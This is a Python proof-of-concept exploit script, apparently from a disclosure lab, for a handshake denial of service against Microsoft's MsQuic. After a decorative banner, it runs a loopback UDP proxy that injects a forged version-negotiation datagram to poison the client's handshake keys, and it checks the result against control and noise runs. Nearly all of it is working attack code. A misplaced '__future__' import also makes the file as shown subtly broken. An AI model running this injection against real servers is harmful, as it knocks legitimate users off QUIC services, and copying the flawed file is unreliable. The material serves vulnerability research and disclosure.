#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: msquic-compat-vn-key-poison (High: 7.5)
#  Vendor: MsQuic (Microsoft)
#  Versions: MsQuic <= v2.6.1 (a01333cf)
#  Impact: Unauth handshake DoS (compatible-VN key poison)
#  Requires: UDP inject from the server 4-tuple, loopback lab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "msquic-compat-vn-key-poison"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

from __future__ import annotations

import os
import signal
import socket
import subprocess
import sys
import threading
import time

WITNESS = "MSQUIC-COMPAT-VN-KEY-POISON-WITNESS"
PROXY_HOST = "127.0.0.1"
PROXY_PORT = 18150
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 18151
INJECT_V2 = bytes([0xF0, 0x6B, 0x33, 0x43, 0xCF, 0x00, 0x00])
INJECT_NOISE = bytes([0xF0, 0x11, 0x22, 0x33, 0x44, 0x00, 0x00])
QUICSAMPLE = os.environ.get("QUICSAMPLE", "/opt/msquic/quicsample")
CERT = "/certs/server.cert"
KEY = "/certs/server.key"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL MSQUIC-COMPAT-VN-KEY-POISON {reason}")
    sys.exit(1)


def saw_connected(text: str) -> bool:
    for line in text.splitlines():
        if "[conn]" in line and "Connected" in line:
            return True
    return False


class LineCollector:
    def __init__(self, proc: subprocess.Popen[str]) -> None:
        self.lines: list[str] = []
        self._lock = threading.Lock()
        self._proc = proc
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _run(self) -> None:
        stdout = self._proc.stdout
        if stdout is None:
            return
        for line in stdout:
            with self._lock:
                self.lines.append(line)

    def text(self) -> str:
        with self._lock:
            return "".join(self.lines)


class UdpProxy:
    def __init__(self, inject: bytes | None) -> None:
        self.inject = inject
        self.stop = threading.Event()
        self.client_ephemeral: tuple[str, int] | None = None
        self.injected = False
        self.first_pkt_len = 0
        self.c2s = 0
        self.s2c = 0
        self.sock: socket.socket | None = None
        self.thread: threading.Thread | None = None
        self.lock = threading.Lock()

    def start(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((PROXY_HOST, PROXY_PORT))
        sock.settimeout(0.1)
        self.sock = sock
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def _loop(self) -> None:
        sock = self.sock
        assert sock is not None
        server_ep = (SERVER_HOST, SERVER_PORT)
        while not self.stop.is_set():
            try:
                data, addr = sock.recvfrom(65535)
            except socket.timeout:
                continue
            except OSError:
                break
            from_server = addr[0] == SERVER_HOST and addr[1] == SERVER_PORT
            if from_server:
                with self.lock:
                    client = self.client_ephemeral
                    if client:
                        self.s2c += 1
                if client:
                    try:
                        sock.sendto(data, client)
                    except OSError:
                        pass
                continue
            with self.lock:
                first = self.client_ephemeral is None
                if first:
                    self.client_ephemeral = addr
                    self.first_pkt_len = len(data)
                self.c2s += 1
            if first and self.inject:
                try:
                    sock.sendto(self.inject, addr)
                    self.injected = True
                except OSError:
                    pass
            try:
                sock.sendto(data, server_ep)
            except OSError:
                pass

    def close(self) -> None:
        self.stop.set()
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
        if self.thread is not None:
            self.thread.join(timeout=2)


def terminate(proc: subprocess.Popen[str] | None) -> None:
    if proc is None or proc.poll() is not None:
        return
    try:
        proc.send_signal(signal.SIGTERM)
        proc.wait(timeout=2)
    except Exception:
        try:
            proc.kill()
            proc.wait(timeout=2)
        except Exception:
            pass


def start_server() -> subprocess.Popen[str]:
    env = os.environ.copy()
    env["LD_LIBRARY_PATH"] = "/opt/msquic:" + env.get("LD_LIBRARY_PATH", "")
    return subprocess.Popen(
        [
            QUICSAMPLE,
            "-server",
            f"-cert_file:{CERT}",
            f"-key_file:{KEY}",
            f"-port:{SERVER_PORT}",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        env=env,
    )


def wait_listening(collector: LineCollector, proc: subprocess.Popen[str], timeout: float) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if "Server listening" in collector.text():
            return True
        if proc.poll() is not None:
            return False
        time.sleep(0.05)
    return "Server listening" in collector.text()


def run_client(timeout: float, stop_on_connected: bool) -> str:
    env = os.environ.copy()
    env["LD_LIBRARY_PATH"] = "/opt/msquic:" + env.get("LD_LIBRARY_PATH", "")
    proc = subprocess.Popen(
        [
            QUICSAMPLE,
            "-client",
            "-unsecure",
            "-target:127.0.0.1",
            f"-port:{PROXY_PORT}",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        env=env,
    )
    collector = LineCollector(proc)
    deadline = time.time() + timeout
    try:
        while time.time() < deadline:
            if proc.poll() is not None:
                break
            if stop_on_connected and saw_connected(collector.text()):
                break
            time.sleep(0.05)
    finally:
        terminate(proc)
        time.sleep(0.05)
    return collector.text()


def run_phase(
    name: str,
    inject: bytes | None,
    client_timeout: float,
    stop_on_connected: bool,
) -> tuple[bool, str | None, bool, str]:
    log(
        f"== phase {name} inject={inject.hex() if inject else 'none'} timeout={client_timeout}s =="
    )
    proxy = UdpProxy(inject)
    server = None
    server_collector = None
    try:
        server = start_server()
        server_collector = LineCollector(server)
        if not wait_listening(server_collector, server, 6.0):
            log(f"IOC {name}-server-start-failed")
            log(server_collector.text())
            return False, None, False, ""
        proxy.start()
        time.sleep(0.15)
        out = run_client(client_timeout, stop_on_connected)
        connected = saw_connected(out)
        with proxy.lock:
            ephemeral = proxy.client_ephemeral
            injected = proxy.injected
            first_len = proxy.first_pkt_len
            c2s = proxy.c2s
            s2c = proxy.s2c
        ep_s = f"{ephemeral[0]}:{ephemeral[1]}" if ephemeral else None
        log(f"IOC phase={name} connected={int(connected)} injected={int(injected)}")
        log(f"IOC phase={name} client_ephemeral={ep_s} first_pkt_len={first_len} c2s={c2s} s2c={s2c}")
        for line in out.splitlines():
            log(f"IOC {name}-client {line}")
        if server_collector is not None:
            for line in server_collector.text().splitlines()[:40]:
                log(f"IOC {name}-server {line}")
        return connected, ep_s, injected, out
    finally:
        proxy.close()
        terminate(server)
        time.sleep(0.25)


def main() -> None:
    if not os.path.isfile(QUICSAMPLE) or not os.access(QUICSAMPLE, os.X_OK):
        fail(f"quicsample missing path={QUICSAMPLE}")
    if not os.path.isfile(CERT) or not os.path.isfile(KEY):
        fail("server cert/key missing")

    control_connected, control_ep, _, _ = run_phase(
        "CONTROL", None, 8.0, True
    )
    if not control_connected:
        log("control_connected=0")
        log("inject_connected=")
        log("negative_connected=")
        log(f"inject_hex={INJECT_V2.hex()}")
        log(f"client_ephemeral={control_ep}")
        fail("control handshake did not Connected (environment)")

    inject_connected, inject_ep, inject_sent, _ = run_phase(
        "INJECT", INJECT_V2, 5.0, False
    )
    if not inject_sent or inject_ep is None:
        log(f"control_connected={int(control_connected)}")
        log(f"inject_connected={int(inject_connected)}")
        log("negative_connected=")
        log(f"inject_hex={INJECT_V2.hex()}")
        log(f"client_ephemeral={inject_ep}")
        fail("inject datagram was not sent from proxy 4-tuple")

    negative_connected, negative_ep, negative_sent, _ = run_phase(
        "NEGATIVE", INJECT_NOISE, 8.0, True
    )

    ephemeral = inject_ep or negative_ep or control_ep
    log(f"control_connected={int(control_connected)}")
    log(f"inject_connected={int(inject_connected)}")
    log(f"negative_connected={int(negative_connected)}")
    log(f"inject_hex={INJECT_V2.hex()}")
    log(f"client_ephemeral={ephemeral}")

    if inject_connected:
        fail("inject v2 still Connected (keys not poisoned)")
    if not negative_sent:
        fail("negative inject datagram was not sent")
    if not negative_connected:
        fail("negative noise handshake did not Connected")

    log(f"SUCCESS {WITNESS}")


if __name__ == "__main__":
    main()

